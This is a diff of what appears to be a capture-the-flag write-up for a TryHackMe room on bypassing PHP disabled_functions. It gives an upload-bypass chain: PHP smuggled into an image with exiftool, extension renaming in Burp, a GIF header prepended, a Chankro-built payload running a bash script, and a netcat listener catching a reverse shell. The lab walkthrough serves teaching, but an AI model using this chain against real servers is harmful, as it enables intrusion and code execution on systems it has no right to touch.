@@ -34,13 +34,7 @@ exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg
 ## Modify teh POST request to change image file extension from .jpg to .php  
 ![](/thm-bdf/thm-bdf-burp.png)
 
-## Navigate to /uploads/street-cat.php  
-For later payloads, we can use curl...  
-```  
-curl https://x.x.x.x/uploads/tryhackme.php
-```  
-
-## We are presented with phpinfo()  
+## Navigate to /uploads/street-cat.php in the browser. We are presented with phpinfo()  
 ![](/thm-bdf/thm-bdf-phpinfo.png)  
 
 Take a look at the disabled_functions and DOCUMENT_ROOT envir0nment variables. The disabled_functions var tells us we can't use many of the classic PHP payload functions. We must resort to using other means. 
@@ -48,14 +42,14 @@ Take a look at the disabled_functions and DOCUMENT_ROOT envir0nment variables. T
 ## Download and install Chankro  
 https://github.com/TarlogicSecurity/Chankro/tree/master
 
-## Generate bash payload (c.sh) using your favorite flavor of text editor or echo. Modify the filepath using CONTEXT_DOCUMENT_ROOT
+## Generate bash payload (c.sh) using your favorite flavor of text editor or echo. Filepath should point to CONTEXT_DOCUMENT_ROOT
 ```bash  
 #! /bin/bash
 find / flag*.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag-location.txt  
 #cat /path/to/flag/flag.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag.txt
 ```  
 
-## Ex3cute chankro command using the path in CONTEXT_DOCUMENT_ROOT as an argument to generate a .php file  
+## Ex3cute chankro command using CONTEXT_DOCUMENT_ROOT value as an argument to generate a .php file  
 ```  
 python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/  
 ```  
@@ -67,7 +61,7 @@ sed -i '1iGIF87a' tryhackme.php
 ```  
 mv tryhackme.php tryhackme.jpg
 ```  
-## Upload the image file using BurpSuite to rename the extension .php  
+## Upload the image file and use BurpSuite to rename the extension .php  
 ![](/thm-bdf/thm-bdf-burp-2.png)
 
 ## Navigate to /uploads/tryhackme.php  
@@ -94,15 +88,18 @@ Here’s how it works:
 
 ## Setup the netcat listener on localhost    
 ```  
-nc -nvlp 9001
+nc -lvnp 9001
 ```  
 
-## Navigate to or curl /uploads/tryhackme.php  
-Our payload is executed and we receive a connection.  
+## Touch off /uploads/tryhackme.php using curl or the browser  
+```  
+curl https://x.x.x.x/uploads/tryhackme.php
+``` 
 
+## Success. Our payload is executed and we receive a connection.  
 ![](/thm-bdf/thm-bdf-nc-mkfifo-shell.png)  
 
-I tried a few variations before settling on the nc mkinfo method. Some results of my testing show us the nature of what Chankro is doing behind the scenes. We obviously called the mail() PHP function to get our c.php to run. Kindof ingenious.  
+I tried a few variations of the reverse shell before settling on the **```nc mkinfo```** method. Some results of my testing show us the nature of what Chankro is doing behind the scenes. We obviously called the mail() PHP function to get our c.php to run. Kindof ingenious. The output I received was from the mail function. **```mail("a", "a", "a", "a");```** 
 
 ## Bind shell  
 ![](/thm-bdf/thm-bdf-bind-shell.png)  
